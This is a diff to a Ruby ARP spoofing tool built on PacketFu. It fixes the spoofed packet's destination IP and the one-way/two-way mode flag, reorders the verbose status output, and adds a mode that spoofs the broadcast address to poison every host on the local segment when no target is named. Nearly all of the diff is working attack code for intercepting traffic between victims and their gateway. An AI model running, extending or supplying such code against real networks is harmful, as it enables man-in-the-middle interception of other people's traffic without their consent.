@@ -82,9 +82,10 @@ def build_pkt(op_code, dest_mac, source_ip, dest_ip)
   @arp_pkt.eth_saddr = @arp_pkt.arp_saddr_mac = @defaults[:eth_saddr]
   @arp_pkt.eth_daddr = @arp_pkt.arp_daddr_mac = dest_mac
   @arp_pkt.arp_saddr_ip = source_ip
+  @arp_pkt.arp_daddr_ip = dest_ip
 end 
-
-#------------------------------------------------------#
+  
+#----------------------------------------------------------------------#
 # Let's set some defaults and variables
 
 if interactive
@@ -120,7 +121,7 @@ if interactive
     print "Spoof target only (1-way), or router as well (2-way)? (1/2): "
     var = gets.chomp
     if  var == "2"
-      @two_way
+      @two_way = true
     elsif var == "1"
       @two_way = false
     else
@@ -159,25 +160,8 @@ else
   @gateway  = options.gateway
   @defaults = PacketFu::Utils.ifconfig(@iface)
 
-  if @verbose
-=begin
-if @smart
-var1 = "Smart s"
-else
-var1 = "S"
-end
-=end  
-var1 = "S"
-    if @gateway
-      var2 = "two-way with gateway #{@gateway}."
-    else
-      var2 = "one-way."
-    end
-    puts "#{var1}poofing #{target} on #{@iface}, #{var2}"
-  end
-
   @two_way = true
-  if !@gateway
+  unless @gateway
     @two_way = false
     net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ } # Guess gateway by parsing netstat
     @gateway = ((net[0]).split)[1]
@@ -189,26 +173,43 @@ var1 = "S"
   end
 end
 
+if @verbose
+=begin
+if @smart
+var1 = "Smart s"
+else
+var1 = "S"
+end
+=end  
+var1 = "S"
+  if @two_way
+    var2 = "two-way with gateway #{@gateway}."
+  else
+    var2 = "one-way."
+  end
+  puts "#{var1}poofing #{target} on #{@iface}, #{var2}"
+end
+
 #----------------------------------------------------------------------#
 
-target_parse(target)
 puts_verbose("\nObtaining mac addresses...")
+
+# Make hash of target ips => target macs
 @targets_hash = {}
-@gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface)
-unless @gateway_mac 
-  (0..1).map { @gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface) } # Try twice more, then exit.
-  puts "Unable to determine gateway mac."
-  sleep 2
-  exit 0 
-end
-puts_verbose "#{@gateway}: mac is #{@gateway_mac} (Gateway)"
-@target.each do |ip|
-  target_mac = PacketFu::Utils::arp(ip, :iface => @iface)
-  @targets_hash[ip] = target_mac     # Makes hash of target ips => target macs
-  if target_mac
-    puts_verbose "#{ip}: mac is #{target_mac}"
-  else
-    puts_verbose "#{ip}: is down"
+if target.nil?
+  puts_verbose "Using broadcast address for target"
+  @targets_hash["0.0.0.0"] = "ff:ff:ff:ff:ff:ff" ###
+  
+else  
+  target_parse(target)
+  @target.each do |ip|
+    target_mac = PacketFu::Utils::arp(ip, :iface => @iface)
+    @targets_hash[ip] = target_mac     
+    if target_mac
+      puts_verbose "#{ip}: mac is #{target_mac}"
+    else
+      puts_verbose "#{ip}: is down"
+    end
   end
 end
 @targets_hash.delete_if { |k, v| v.nil? }
